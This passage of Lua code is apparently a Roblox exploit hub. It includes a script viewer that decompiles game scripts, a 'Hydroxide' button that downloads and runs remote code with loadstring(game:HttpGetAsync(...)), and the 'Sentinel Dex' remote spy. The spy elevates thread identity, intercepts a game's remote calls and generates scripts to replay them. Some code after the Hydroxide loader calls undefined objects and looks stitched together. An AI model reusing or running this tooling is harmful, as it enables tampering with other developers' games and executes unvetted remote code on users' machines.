	{["Keyword"] = "while", ["Color"] = Color3.new(0, 0, 127/255), ["Independent"] = true},
	{["Keyword"] = "end", ["Color"] = Color3.new(0, 0, 127/255), ["Independent"] = true},
	{["Keyword"] = "function", ["Color"] = Color3.new(0, 0, 127/255), ["Independent"] = true},
	{["Keyword"] = "string", ["Color"] = Color3.new(0, 0, 127/255), ["Independent"] = true},
	{["Keyword"] = "table", ["Color"] = Color3.new(0, 0, 127/255), ["Independent"] = true},
	{["Keyword"] = "game", ["Color"] = Color3.new(0, 0, 127/255), ["Independent"] = true},
	{["Keyword"] = "workspace", ["Color"] = Color3.new(0, 0, 127/255), ["Independent"] = true},
	{["Keyword"] = "return", ["Color"] = Color3.new(0, 0, 127/255), ["Independent"] = true},
	{["Keyword"] = "break", ["Color"] = Color3.new(0, 0, 127/255), ["Independent"] = true},
	{["Keyword"] = "elseif", ["Color"] = Color3.new(0, 0, 127/255), ["Independent"] = true},
	{["Keyword"] = "in", ["Color"] = Color3.new(0, 0, 127/255), ["Independent"] = true},
	{["Keyword"] = "pairs", ["Color"] = Color3.new(0, 0, 127/255), ["Independent"] = true},
	{["Keyword"] = "ipairs", ["Color"] = Color3.new(0, 0, 127/255), ["Independent"] = true}
}

function checkMouseInGui(gui)
	if gui == nil then return false end
	local plrMouse = game.Players.LocalPlayer:GetMouse()
	local guiPosition = gui.AbsolutePosition
	local guiSize = gui.AbsoluteSize	
	
	if plrMouse.X >= guiPosition.x and plrMouse.X <= guiPosition.x + guiSize.x and plrMouse.Y >= guiPosition.y and plrMouse.Y <= guiPosition.y + guiSize.y then
		return true
	else
		return false
	end
end

function AddZeros(num,reach)
	local toConvert = tostring(num)
	while #toConvert < reach do
		toConvert = " "..toConvert
	end
	return toConvert
end

function buildScript(source,xOff,yOff,override)
	local buildingRows = true
	local buildScr = source
	
	local totalLines = 0
	
	--print(xOff,yOff)
	
	if currentSource ~= source then
		currentSource = source
	end

	if override then
		currentSource = source
		entries = {}
		while buildingRows do
			local x,y = string.find(buildScr,"\n")
			if x and y then
				table.insert(entries,string.sub(buildScr,1,y))
				buildScr = string.sub(buildScr,y+1,string.len(buildScr))
			else
				buildingRows = false
				table.insert(entries,buildScr)
			end
		end
	end
	
	totalLines = #entries
	lineSpan = #tostring(totalLines)
	
	if lineSpan == 1 then lineSpan = 2 end
	
	local currentRow = 1
	local currentColumn = 2 + lineSpan
	
	local colorTime = 0
	local colorReplace = nil
	
	local inString = false
	
	local workingEntries = entries
	
	--[[
	for i,v in pairs(entries) do
		table.insert(workingEntries,v)
	end
	
	for i = 1,yOff do
		table.remove(workingEntries,1)
	end
	--]]
	
	local delayance = xOff

	for i = 1,#grid do
		for j = 1,#grid[i] do
			if i <= lineSpan then
				local newNum = AddZeros(yOff + j,lineSpan)
				local newDigit =  string.sub(newNum,i,i)
				if newDigit == " " then
					grid[i][j].Text = ""
				else
					grid[i][j].Text = newDigit
				end
				grid[i][j].BackgroundTransparency = 0
				grid[i][j].BackgroundColor3 = Color3.new(163/255, 162/255, 165/255)
				--grid[i][j].Font = Enum.Font.SourceSansBold
			elseif i == lineSpan + 1 then
				grid[i][j].Text = ""
				grid[i][j].BackgroundTransparency = 0
				grid[i][j].BackgroundColor3 = Color3.new(200/255, 200/255, 200/255)
				--grid[i][j].Font = Enum.Font.SourceSans
			else
				grid[i][j].Text = ""
				grid[i][j].BackgroundTransparency = 1
				--grid[i][j].Font = Enum.Font.SourceSans
			end
		end
	end
	
	while true do
		if currentRow > #workingEntries or currentRow > #grid[1] then break end
		local entry = workingEntries[currentRow+yOff]
		while string.len(entry) > 0 do
			if string.sub(entry,1,1) == "\t" then entry = "    "..string.sub(entry,2) end
			
			if currentColumn > #grid then break end
			
			if delayance == 0 then
				grid[currentColumn][currentRow].Text = string.sub(entry,1,1)
			end
			
			-- Coloring
			
			if not inString then
				for i,v in pairs(syntaxHighlightList) do
					if string.sub(entry,1,string.len(v["Keyword"])) == v["Keyword"] then
						if v["Independent"] then
							local outCheck = string.len(v["Keyword"])+1
							local outEntry = string.sub(entry,outCheck,outCheck)
							if not string.find(outEntry,"%w") then
								colorTime = string.len(v["Keyword"])
								colorReplace = v["Color"]
							end
						else
							colorTime = string.len(v["Keyword"])
							colorReplace = v["Color"]
						end
					end
				end
			end
			
			if string.sub(entry,1,1) == "\"" and string.match(entry,"\".+\"") then
				inString = true
				colorTime = string.len(string.match(entry,"\".+\""))
				colorReplace = Color3.new(170/255, 0, 1)
			end
			
			if colorTime > 0 then
				colorTime = colorTime - 1
				grid[currentColumn][currentRow].TextColor3 = colorReplace
				if colorTime == 0 then inString = false end
			else
				grid[currentColumn][currentRow].TextColor3 = Color3.new(0,0,0)
				inString = false
			end
			
			if delayance == 0 then
				currentColumn = currentColumn + 1
			else
				delayance = delayance - 1
			end
			entry = string.sub(entry,2,string.len(entry))
		end
		currentRow = currentRow + 1
		currentColumn = 2 + lineSpan
		colorTime = 0
		delayance = xOff
		inString = false
	end
end

function scrollBar.UpdateCallback(self)
	scrollBar.TotalSpace = #entries * 16
	scrollBar.VisibleSpace = editorGrid.AbsoluteSize.Y
	buildScript(currentSource,math.floor(scrollBarH.ScrollIndex/8),math.floor(scrollBar.ScrollIndex/16))
end

function scrollBarH.UpdateCallback(self)
	scrollBarH.TotalSpace = (getLongestEntry(entries) + 1 + lineSpan) * 8
	scrollBarH.VisibleSpace = editorGrid.AbsoluteSize.X
	buildScript(currentSource,math.floor(scrollBarH.ScrollIndex/8),math.floor(scrollBar.ScrollIndex/16))
end

function getLongestEntry(tab)
	local longest = 0
	for i,v in pairs(tab) do
		if string.len(v) > longest then
			longest = string.len(v)
		end
	end
	return longest
end

function openScript(scrObj)
	if scrObj:IsA("LocalScript") then
		scrObj.Archivable = true
		scrObj = scrObj:Clone()
		scrObj.Disabled = true
	end
	
	local scrName = scrObj.Name
	local scrSource = decompile(scrObj)
	
	table.insert(memoryScripts,{Name = scrName,Source = scrSource})
	
	local newTab = entryTemplate:Clone()
	newTab.Button.Text = scrName
	newTab.Position = UDim2.new(0,#scriptBar:GetChildren() * 100,0,0)
	newTab.Visible = true
	
	newTab.Button.MouseButton1Down:connect(function()
		for i,v in pairs(scriptBar:GetChildren()) do
			if v == newTab then
				editingIndex = i
				buildScript(memoryScripts[i].Source,0,0,true)
				scrollBar:ScrollTo(1)
				scrollBar:Update()
				scrollBarH:ScrollTo(1)
				scrollBarH:Update()
			end
		end
	end)
	
	newTab.Close.MouseButton1Click:connect(function()
		for i,v in pairs(scriptBar:GetChildren()) do
			if v == newTab then
				table.remove(memoryScripts,i)
				if editingIndex == i then
					editingIndex = #memoryScripts
					if editingIndex > 0 then
						buildScript(memoryScripts[#memoryScripts].Source,0,0,true)
					else
						buildScript("",0,0,true)
					end
				end
				
				scrollBar:ScrollTo(1)
				scrollBar:Update()
				scrollBarH:ScrollTo(1)
				scrollBarH:Update()
				
				for i2 = i,#scriptBar:GetChildren() do
					scriptBar:GetChildren()[i2].Position = scriptBar:GetChildren()[i2].Position + UDim2.new(0,-100,0,0)
				end
				if editingIndex > i then
					editingIndex = editingIndex - 1
				end
				newTab:Destroy()
			end
		end
	end)
	
	editingIndex = #memoryScripts
	buildScript(scrSource,0,0,true)
	
	newTab.Parent = scriptBar
end

function updateScriptBar()
	local entryCount = 0
	
	scriptBarLeft.Active = false
	scriptBarLeft.AutoButtonColor = false
	for i,v in pairs(scriptBarLeft["Arrow Graphic"]:GetChildren()) do
		v.BackgroundTransparency = 0.7
	end
	scriptBarRight.Active = false
	scriptBarRight.AutoButtonColor = false
	for i,v in pairs(scriptBarRight["Arrow Graphic"]:GetChildren()) do
		v.BackgroundTransparency = 0.7
	end
	for i,v in pairs(scriptBar:GetChildren()) do
		if v.Position.X.Offset < 0 then
			scriptBarLeft.Active = true
			scriptBarLeft.AutoButtonColor = true
			for i,v in pairs(scriptBarLeft["Arrow Graphic"]:GetChildren()) do
				v.BackgroundTransparency = 0
			end
		elseif v.Position.X.Offset >= 0 then
			entryCount = entryCount + 1
			if entryCount == 5 then
				scriptBarRight.Active = true
				scriptBarRight.AutoButtonColor = true
				for i,v in pairs(scriptBarRight["Arrow Graphic"]:GetChildren()) do
					v.BackgroundTransparency = 0
				end
			end
		end
	end
end

scriptBar.ChildAdded:connect(updateScriptBar)
scriptBar.ChildRemoved:connect(updateScriptBar)

scriptBarLeft.MouseButton1Click:connect(function()
	if scriptBarLeft.Active == false then return end
	for i,v in pairs(scriptBar:GetChildren()) do
		v.Position = v.Position + UDim2.new(0,100,0,0)
	end
	updateScriptBar()
end)

scriptBarRight.MouseButton1Click:connect(function()
	if scriptBarRight.Active == false then return end
	for i,v in pairs(scriptBar:GetChildren()) do
		v.Position = v.Position + UDim2.new(0,-100,0,0)
	end
	updateScriptBar()
end)

mouse.Button1Down:connect(function()
	if checkMouseInGui(editorGrid) then
		--print("LETS EDIT!")
	end
end)

openEvent.Event:connect(function(...)
	top.Visible = true
	local args = {...}
	if #args > 0 then
		openScript(args[1])
	end
end)

clipboardButton.MouseButton1Click:connect(function()
	if Clipboard and Clipboard.set then
		Clipboard.set(currentSource)
	elseif CopyString then
		CopyString(currentSource)
	end
end)

closeButton.MouseButton1Click:connect(function()
	top.Visible = false
end)

--[[
local scr = script.Parent:WaitForChild("Scr")
local scr2 = script.Parent:WaitForChild("Scr2")
local scr3 = script.Parent:WaitForChild("Scr3")
local scr4 = script.Parent:WaitForChild("TOS")
local scr5 = script.Parent:WaitForChild("HW")
--]]

buildScript("",0,0,true)
--[[
openScript(scr)
openScript(scr2)
openScript(scr3)
openScript(scr4)
openScript(scr5)
--]]

scrollBar:Update()
scrollBarH:Update()
end)  
end)

c:Button("Hydroxide",function()
   loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/0x90-NOP/Hydroxide/master/main.lua"))()

local scripts, modules = abs.getScripts()

ui.addButton("Scripts", scripts, root, {icon = 3285607721})
ui.addButton("Modules", modules, root, {icon = 3285696601})
ui.addButton("_G", getrenv()._G)
ui.addButton("shared", getrenv().shared)

end)

c:Button("Sentinel Dex",function()
   local coregui = game:GetService("CoreGui");
assert(not getgenv().dex_loaded, "Dex is already loaded");
getgenv().dex_loaded = true
math.randomseed(tick())
local UserInputService = game:GetService("UserInputService");

local TweenService = game:service'TweenService';
local setthreadcontext = setthreadcontext or syn.set_thread_identity;
function RandomCharacters(length)
	local STR = "";
	for i = 1, length do
		STR = STR .. string.char(math.random(65,90));
	end;
	return STR;
end;

local dragger = {}; 
do
	local players = game:service('Players');
	local player = players.LocalPlayer;
	local mouse = player:GetMouse();
	local run = game:service('RunService');
	local stepped = run.Stepped;
	dragger.new = function(obj)
    	spawn(function()
        	local minitial;
        	local initial;
        	local isdragging;
        	obj.InputBegan:Connect(function(input)
            	if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
                	isdragging = true;
                	minitial = input.Position;
                	initial = obj.Position;
                	local con;
                	con = stepped:Connect(function()
                    	if isdragging then
                        	local delta = Vector3.new(mouse.X, mouse.Y, 0) - minitial;
                        	obj.Position = UDim2.new(initial.X.Scale, initial.X.Offset + delta.X, initial.Y.Scale, initial.Y.Offset + delta.Y);
                    	else
                        	con:Disconnect();
                    	end;
               	 	end);
                	input.Changed:Connect(function()
                    	if input.UserInputState == Enum.UserInputState.End then
                        	isdragging = false;
                    	end;
                	end);
            	end;
        	end);
    	end)
	end;
end;

local localPlayer = game:GetService("Players").LocalPlayer;
local dexSpy = game:GetObjects("rbxassetid://4543296899")[1];
local remoteEvent = game:GetObjects("rbxassetid://4543177020")[1];
local remoteFunction = game:GetObjects("rbxassetid://4543178955")[1];
remoteEvent.BackgroundColor3 = Color3.fromRGB(140, 30, 49); 
remoteEvent.AutoButtonColor = false;
remoteFunction.BackgroundColor3 = Color3.fromRGB(140, 30, 49); 
remoteFunction.AutoButtonColor = false;
local tweenService = game:GetService("TweenService");
local players = game:GetService("Players");
local mouse = localPlayer:GetMouse();
local mainFrame = dexSpy.mainFrame;
local topbarFrame = mainFrame.topbarFrame;
local exitBtn = topbarFrame.exitBtn;
local miniBtn = topbarFrame.miniBtn;
local sentinelLogo = topbarFrame.sentinelLogo;
local scriptsFrame = mainFrame.scriptsFrame;
local scriptsScrollingFrame = scriptsFrame.scriptsScrollingFrame;
local scriptsBox = scriptsScrollingFrame.scriptsBox;
local highlightLabel = scriptsBox.highlightLabel;
local testLabel = scriptsBox.testLabel;
local remotesFrame = mainFrame.remotesFrame;
local remotesScrollingFrame = remotesFrame.remotesScrollingFrame;
local clearBtn = mainFrame.clearBtn;
local copyBtn = mainFrame.copyBtn;
local copyRemBtn = mainFrame.copyRemBtn
local copyScrBtn = mainFrame.copyScrBtn;
local currentButton;
local dlogs, logs = {}, {};
local syntaxHighlight, transformPath, dumpTable, ValueToReadable;
local textYSize = scriptsBox.TextSize;
dexSpy.Enabled = false;
dexSpy.Parent = coregui;

local function draggable(obj)
	spawn(function()
		local dragging = false;
		local draggableToggle;
		local draggableInput;
		local draggableStart;

		obj.topbarFrame.InputBegan:Connect(function(input)
			if input.UserInputType == Enum.UserInputType.MouseButton1 then
				dragging = true;
				draggableStart = input.Position;
				startPos = obj.AbsolutePosition;
			end;
		end);
		
		obj.topbarFrame.InputEnded:Connect(function(input)
			if input.UserInputType == Enum.UserInputType.MouseButton1 then
				dragging = false;
			end;
		end);
		
		UserInputService.InputChanged:Connect(function(input)
			if obj.Parent.Enabled and input.UserInputType == Enum.UserInputType.MouseMovement and dragging then
				local res = obj.Parent.AbsoluteSize;
				obj.Position = UDim2.new(0, startPos.X + (input.Position.X - draggableStart.X), 0, startPos.Y + (input.Position.Y - draggableStart.Y));
			end;
		end);
	end);
end;

do --// UI Setup
	draggable(mainFrame);
	
	local keywords = {
        {["Keyword"] = "print", ["Color"] = Color3.fromRGB(123, 216, 143)};
        {["Keyword"] = "warn", ["Color"] = Color3.fromRGB(123, 216, 143)};
        {["Keyword"] = "FireServer", ["Color"] = Color3.fromRGB(123, 216, 143)};
        {["Keyword"] = "InvokeServer", ["Color"] = Color3.fromRGB(123, 216, 143)};
        {["Keyword"] = "game", ["Color"] = Color3.fromRGB(252, 97, 141)};
        {["Keyword"] = "for", ["Color"] = Color3.fromRGB(252, 97, 141)};
        {["Keyword"] = "and", ["Color"] = Color3.fromRGB(252, 97, 141)};
        {["Keyword"] = "or", ["Color"] = Color3.fromRGB(252, 97, 141)};
        {["Keyword"] = "local", ["Color"] = Color3.fromRGB(252, 97, 141)};
        {["Keyword"] = "if", ["Color"] = Color3.fromRGB(252, 97, 141)};
        {["Keyword"] = "then", ["Color"] = Color3.fromRGB(252, 97, 141)};
        {["Keyword"] = "do", ["Color"] = Color3.fromRGB(252, 97, 141)};
        {["Keyword"] = "while", ["Color"] = Color3.fromRGB(252, 97, 141)};
        {["Keyword"] = "repeat", ["Color"] = Color3.fromRGB(252, 97, 141)};
        {["Keyword"] = "until", ["Color"] = Color3.fromRGB(252, 97, 141)};
        {["Keyword"] = "end", ["Color"] = Color3.fromRGB(252, 97, 141)};
        {["Keyword"] = "function", ["Color"] = Color3.fromRGB(252, 97, 141)};
        {["Keyword"] = "return", ["Color"] = Color3.fromRGB(252, 97, 141)};
        {["Keyword"] = "break", ["Color"] = Color3.fromRGB(252, 97, 141)};
        {["Keyword"] = "else", ["Color"] = Color3.fromRGB(252, 97, 141)};
        {["Keyword"] = "elseif", ["Color"] = Color3.fromRGB(252, 97, 141)};
        {["Keyword"] = "require", ["Color"] = Color3.fromRGB(252, 97, 141)};
        {["Keyword"] = "script", ["Color"] = Color3.fromRGB(252, 97, 141)};
        {["Keyword"] = "loadstring", ["Color"] = Color3.fromRGB(123, 216, 143)};
        {["Keyword"] = "GetService", ["Color"] = Color3.fromRGB(123, 216, 143)};
        {["Keyword"] = "self", ["Color"] = Color3.fromRGB(252, 97, 141)};
        {["Keyword"] = "Ray", ["Color"] = Color3.fromRGB(252, 97, 141)};
        {["Keyword"] = "Color3", ["Color"] = Color3.fromRGB(252, 97, 141)};
        {["Keyword"] = "fromRGB", ["Color"] = Color3.fromRGB(123, 216, 143)};
        {["Keyword"] = "new", ["Color"] = Color3.fromRGB(123, 216, 143)};
        {["Keyword"] = "in", ["Color"] = Color3.fromRGB(252, 97, 141)};
        {["Keyword"] = "(", ["Color"] = Color3.fromRGB(252, 97, 141), ["Independent"] = true};
        {["Keyword"] = ")", ["Color"] = Color3.fromRGB(252, 97, 141), ["Independent"] = true};
        {["Keyword"] = "{", ["Color"] = Color3.fromRGB(252, 97, 141), ["Independent"] = true};
        {["Keyword"] = "}", ["Color"] = Color3.fromRGB(252, 97, 141), ["Independent"] = true};
        {["Keyword"] = "[", ["Color"] = Color3.fromRGB(252, 97, 141), ["Independent"] = true};
        {["Keyword"] = "]", ["Color"] = Color3.fromRGB(252, 97, 141), ["Independent"] = true};
        {["Keyword"] = "+", ["Color"] = Color3.fromRGB(252, 97, 141), ["Independent"] = true};
        {["Keyword"] = "-", ["Color"] = Color3.fromRGB(252, 97, 141), ["Independent"] = true};
        {["Keyword"] = "*", ["Color"] = Color3.fromRGB(252, 97, 141), ["Independent"] = true};
        {["Keyword"] = "/", ["Color"] = Color3.fromRGB(252, 97, 141), ["Independent"] = true};
        {["Keyword"] = "%", ["Color"] = Color3.fromRGB(252, 97, 141), ["Independent"] = true};
        {["Keyword"] = "^", ["Color"] = Color3.fromRGB(252, 97, 141), ["Independent"] = true};
        {["Keyword"] = "=", ["Color"] = Color3.fromRGB(252, 97, 141), ["Independent"] = true};
        {["Keyword"] = ",", ["Color"] = Color3.fromRGB(252, 97, 141), ["Independent"] = true};
        {["Keyword"] = "<", ["Color"] = Color3.fromRGB(252, 97, 141), ["Independent"] = true};
        {["Keyword"] = ">", ["Color"] = Color3.fromRGB(252, 97, 141), ["Independent"] = true};
        {["Keyword"] = ";", ["Color"] = Color3.fromRGB(252, 97, 141), ["Independent"] = true};
        {["Keyword"] = "true", ["Color"] = Color3.fromRGB(122, 114, 185)};
        {["Keyword"] = "false", ["Color"] = Color3.fromRGB(122, 114, 185)};
        {["Keyword"] = "nil", ["Color"] = Color3.fromRGB(122, 114, 185)};
    };

    function syntaxHighlight() [nonamecall]
        setthreadcontext(6);
        local text = scriptsBox.Text;
        local pos = 0;
        local newLine = 0;
        local newLinePos = 0;
        local inString = false;
		local inComment = false;
		local blacklistedNumberPos;
        for i, v in pairs(scriptsBox:GetChildren()) do
            if v.Name == "highlightLabel" then
                v:Destroy();
            end;
        end;
        text:gsub(".", function(char)
            for i, v in pairs(keywords) do
                if not inString and not inComment and char == v["Keyword"]:sub(1, 1) and text:sub(pos + 1, pos + #v["Keyword"]) == v["Keyword"] then
                    if not v["Independent"] and not text:sub(pos, pos):match("%w") and not text:sub((pos + #v["Keyword"]) + 1, (pos + #v["Keyword"]) + 1):match("%w") then
                        local pastText = text:sub(newLinePos, pos);
                        local testLabel = testLabel:Clone();
                        testLabel.Parent = coregui;
                        testLabel.Text = pastText;
                        local xPos = testLabel.TextBounds.X;
                        testLabel:Destroy();
                        local highlightLabel = highlightLabel:Clone();
                        highlightLabel.Name = "highlightLabel";
                        highlightLabel.TextColor3 = v["Color"];
                        highlightLabel.Text = v["Keyword"];
                        highlightLabel.Position = UDim2.new(0, xPos, 0, newLine * textYSize);
                        highlightLabel.Parent = scriptsBox;
                    elseif v["Independent"] then
                        local pastText = text:sub(newLinePos, pos);
                        local testLabel = testLabel:Clone();
                        testLabel.Parent = coregui;
                        testLabel.Text = pastText;
                        local xPos = testLabel.TextBounds.X;
                        testLabel:Destroy();
                        local highlightLabel = highlightLabel:Clone();
                        highlightLabel.Name = "highlightLabel";
                        highlightLabel.TextColor3 = v["Color"];
                        highlightLabel.Text = v["Keyword"];
                        highlightLabel.Position = UDim2.new(0, xPos, 0, newLine * textYSize);
                        highlightLabel.Parent = scriptsBox;
                    end;
                end;
            end;
            if not inString and not inComment and tonumber(char) and not text:sub(pos + 2, pos + 2):match("%a") then
                if not text:sub(pos, pos):match("%a") and pos ~= blacklistedNumberPos then
                    local pastText = text:sub(newLinePos, pos);
                    local testLabel = testLabel:Clone();
                    testLabel.Parent = coregui;
                    testLabel.Text = pastText;
                    local xPos = testLabel.TextBounds.X;
                    testLabel:Destroy();
                    local highlightLabel = highlightLabel:Clone();
                    highlightLabel.Name = "highlightLabel";
                    highlightLabel.TextColor3 = Color3.fromRGB(122, 114, 185);
                    highlightLabel.Text = char;
                    highlightLabel.Position = UDim2.new(0, xPos, 0, newLine * textYSize);
                    highlightLabel.Parent = scriptsBox;
                else
                    blacklistedNumberPos = pos + 1;
                end;
            elseif char == '"' and not inComment then
                inString = not inString;
                local pastText = text:sub(newLinePos, pos);
                local testLabel = testLabel:Clone();
                testLabel.Parent = coregui;
                testLabel.Text = pastText;
                local xPos = testLabel.TextBounds.X;
                testLabel:Destroy();
                local highlightLabel = highlightLabel:Clone();
                highlightLabel.Name = "highlightLabel";
                highlightLabel.TextColor3 = Color3.fromRGB(243, 221, 99);
                highlightLabel.Text = char;
                highlightLabel.Position = UDim2.new(0, xPos, 0, newLine * textYSize);
                highlightLabel.Parent = scriptsBox;
            elseif char == "'" and not inComment then
                inString = not inString;
                local pastText = text:sub(newLinePos, pos);
                local testLabel = testLabel:Clone();
                testLabel.Parent = coregui;
                testLabel.Text = pastText;
                local xPos = testLabel.TextBounds.X;
                testLabel:Destroy();
                local highlightLabel = highlightLabel:Clone();
                highlightLabel.Name = "highlightLabel";
                highlightLabel.TextColor3 = Color3.fromRGB(243, 221, 99);
                highlightLabel.Text = char;
                highlightLabel.Position = UDim2.new(0, xPos, 0, newLine * textYSize);
                highlightLabel.Parent = scriptsBox;
            elseif char == "-" and text:sub(pos + 2, pos + 2) == "-" and not inString then
                inComment = true;
                local pastText = text:sub(newLinePos, pos);
                local testLabel = testLabel:Clone();
                testLabel.Parent = coregui;
                testLabel.Text = pastText;
                local xPos = testLabel.TextBounds.X;
                testLabel:Destroy();
                local highlightLabel = highlightLabel:Clone();
                highlightLabel.Name = "highlightLabel";
                highlightLabel.TextColor3 = Color3.fromRGB(105, 103, 108);
                highlightLabel.Text = char;
                highlightLabel.Position = UDim2.new(0, xPos, 0, newLine * textYSize);
                highlightLabel.Parent = scriptsBox;
            elseif char == "\n" then
                inComment = false;
                newLinePos = pos + 1;
                newLine = newLine + 1;
            else
                if inString then
                    local pastText = text:sub(newLinePos, pos);
                    local testLabel = testLabel:Clone();
                    testLabel.Parent = coregui;
                    testLabel.Text = pastText;
                    local xPos = testLabel.TextBounds.X;
                    testLabel:Destroy();
                    local highlightLabel = highlightLabel:Clone();
                    highlightLabel.Name = "highlightLabel";
                    highlightLabel.TextColor3 = Color3.fromRGB(243, 221, 99);
                    highlightLabel.Text = char;
                    highlightLabel.Position = UDim2.new(0, xPos, 0, newLine * textYSize);
                    highlightLabel.Parent = scriptsBox;
                elseif inComment then
                    local pastText = text:sub(newLinePos, pos);
                    local testLabel = testLabel:Clone();
                    testLabel.Parent = coregui;
                    testLabel.Text = pastText;
                    local xPos = testLabel.TextBounds.X;
                    testLabel:Destroy();
                    local highlightLabel = highlightLabel:Clone();
                    highlightLabel.Name = "highlightLabel";
                    highlightLabel.TextColor3 = Color3.fromRGB(105, 103, 108);
                    highlightLabel.Text = char;
                    highlightLabel.Position = UDim2.new(0, xPos, 0, newLine * textYSize);
                    highlightLabel.Parent = scriptsBox;
                end;
            end;
            pos = pos + 1;
        end);
    end;

    local buttons = {
        ["copyBtn"] = function() if currentButton then setclipboard(logs[currentButton]["Loading Script"]) end end,
        ["clearBtn"] = function() logs = {}; for i, v in pairs(remotesScrollingFrame:GetChildren()) do if not v:IsA("UIListLayout") then v:Destroy(); end; end; remotesScrollingFrame.CanvasSize = UDim2.new(0, 0, 0, 0); currentButton = nil; end,
        ["exitBtn"] = function() currentRemote = nil; mainFrame:TweenSize(UDim2.new(0, 565, 0, 28), Enum.EasingDirection.Out, Enum.EasingStyle.Quad, 0.25); wait(0.25); mainFrame:TweenSize(UDim2.new(0, 0, 0, 28), Enum.EasingDirection.Out, Enum.EasingStyle.Quad, 0.25); wait(0.25); dexSpy.Enabled = false; mainFrame.Size = UDim2.new(0, 565, 0, 348); end,
        ["miniBtn"] = function()
            if mainFrame.Size ~= UDim2.new(0, 565, 0, 28) then
                mainFrame:TweenSize(UDim2.new(0, 565, 0, 28), Enum.EasingDirection.Out, Enum.EasingStyle.Quad, 0.25, true);
            else
                mainFrame:TweenSize(UDim2.new(0, 565, 0, 348), Enum.EasingDirection.Out, Enum.EasingStyle.Quad, 0.25, true);
            end;
        end,
        ["copyRemBtn"] = function() if currentButton then setclipboard(transformPath(logs[currentButton]["Remote"]:GetFullName())); end; end,
        ["copyScrBtn"] = function() if currentButton then setclipboard(transformPath(logs[currentButton]["Calling Script"]:GetFullName())); end; end
    };

    for i, v in pairs(mainFrame:GetDescendants()) do
        if buttons[v.Name] then
            v.InputBegan:Connect(function(input)
                if input.UserInputType == Enum.UserInputType.MouseMovement then
                    tweenService:Create(v, TweenInfo.new(0.1), {ImageTransparency = 0}):Play();
                end;
            end);
            v.InputEnded:Connect(function(input)
                if input.UserInputType == Enum.UserInputType.MouseMovement then
                    tweenService:Create(v, TweenInfo.new(0.1 ), {ImageTransparency = 1}):Play();
                end;
            end);
            v.MouseButton1Click:Connect(buttons[v.Name]);
        end;
    end;

    remotesScrollingFrame.ChildAdded:Connect(function(child)
        local xBounds = child.remoteLabel.TextBounds.X;
        local canSize = remotesScrollingFrame.CanvasSize
        if xBounds >  canSize.X.Offset then
            remotesScrollingFrame.CanvasSize = UDim2.new(0, xBounds+40, 0, (#remotesScrollingFrame:GetChildren() - 1) * 24);
            return
        end;
        remotesScrollingFrame.CanvasSize = UDim2.new(0, canSize.X.Offset, 0, (#remotesScrollingFrame:GetChildren() - 1) * 24);
    end);
end;

do --// Extra Functions (From Hydroxide)
    transformPath = function(path) [nonamecall]
        local split = path:split('.');
        local result = "";
        local name = localPlayer.Name;
        
        if #split == 1 and not game:FindFirstChild(split[1]) then
            return split[1] .. " --[[ Parent is \"nil\" or object is destroyed ]]";
        end;

        if pcall(game.GetService, game, split[1]) then
            split[1] = "GetService(\"" .. split[1] .. "\")";
        end;
        
        for i,v in pairs(split) do
            if (v:sub(1, 1):match("%A") or v:find("%W")) and not v:find("GetService") then
                result = result:sub(1, result:len());
                v = "[\"" .. v .. "\"]";
            elseif v:find("GetService") then
                v = ':' .. v;
            else
                v = '.' .. v;
            end;
            
            result = result .. v;
        end;
        
        result = result:gsub("GetService(\"Players\")." .. name, "GetService(\"Players\").LocalPlayer");
        result = result:gsub("GetService(\"Players\")[\"" .. name .. "\"]", "GetService(\"Players\").LocalPlayer");

        return "game" .. result;
    end;

    dumpTable = function(t) [nonamecall]
        local result = "{";

        for i, v in pairs(t) do
            local class = typeof(index)

            if class == "table" then
                result = result .. '[' .. dumpTable(index) .. ']'
            elseif class == "string" then
                if index:find("%A") then
                    result = result .. "[\"" .. index .. "\"]"
                else
                    result = result .. index
                end
            elseif class == "number" then
            elseif class == "Instance" then
                result = result .. '[' ..  transformPath(index:GetFullName()) .. ']';
            elseif class ~= "nil" then
                result = result .. tostring(index);
            end;
            
            if class ~= "number" and class ~= "nil" then
                result = result .. " = ";
            end;

            result = result ..   ValueToReadable(v) .. ', ';
        end;

        if result:sub(result:len() - 1, result:len()) == ", " then
            result = result:sub(1, result:len() - 2);
        end;

        return result .. "}";
    end;

    ValueToReadable = function(value) [nonamecall]
        local result = "";
        local ttype = typeof(value);

        if ttype == "table" then
            result = result .. dumpTable(value);
        elseif ttype == "string" then
            result = result .. '"' .. value .. '"';
        elseif ttype == "Instance" then
            result = result ..  transformPath(value:GetFullName());
        elseif ttype == "Vector3" then
            result = result .. "Vector3.new(" .. tostring(value) .. ")";
        elseif ttype == "CFrame" then
            result = result .. "CFrame.new(" .. tostring(value) .. ")";
        elseif ttype == "Color3" then
            result = result .. "Color3.new(" .. tostring(value) .. ")";
        elseif ttype == "Ray" then
            local split = tostring(value):split('}, ')
            local origin = split[1]:gsub('{', "Vector3.new("):gsub('}', ')');
            local direction = split[2]:gsub('{', "Vector3.new("):gsub('}', ')');
            result = result .. "Ray.new(" .. origin .. "), " .. direction .. ')';
        elseif ttype == "ColorSequence" then
            result = result .. "ColorSequence.new(" .. dumpTable(v.Keypoints) .. ')';
        elseif ttype == "ColorSequenceKeypoint" then
            result = result .. "ColorSequenceKeypoint.new(" .. value.Time .. ", Color3.new(" .. tostring(value.Value) .. "))";
        else
            if type(value) == "userdata" then
                
            end;
            
            result = result .. tostring(value);
        end;

        return result;
    end;
end;

local function saveData(button, remote, callingScript, ...) [nonamecall]
	local args = {...};
	local callerScript = "";
    local localArgs = {};
    
	for i,v in pairs(args) do
		table.insert(localArgs, "Sentinel" .. i);
		callerScript = callerScript .. "local Sentinel" .. i .. " = " .. ValueToReadable(v) .. "\n";
    end;
    
    callerScript = callerScript .. transformPath(remote:GetFullName()) .. ":" .. (remote:IsA("RemoteEvent") and "FireServer" or "InvokeServer") .. "(" .. table.concat(localArgs, ",") .. ")";
    
	local data = {
		["Remote"] = remote,
		["Calling Script"] = callingScript,
		["Loading Script"] = callerScript
    };
    
	logs[button] = data;
end;

local function log(remote, ...) [nonamecall]
	setthreadcontext(6);
	local remoteButton;
	if remote:IsA("RemoteEvent") then
		remoteButton = remoteEvent:Clone();
	elseif remote:IsA("RemoteFunction") then
		remoteButton = remoteFunction:Clone();
	end
	remoteButton.remoteLabel.Text = remote.Name;
    remoteButton.Parent = remotesScrollingFrame;
	saveData(remoteButton, remote, getfenv(3).script, ...);
	remoteButton.MouseEnter:Connect(function()
		setthreadcontext(6);
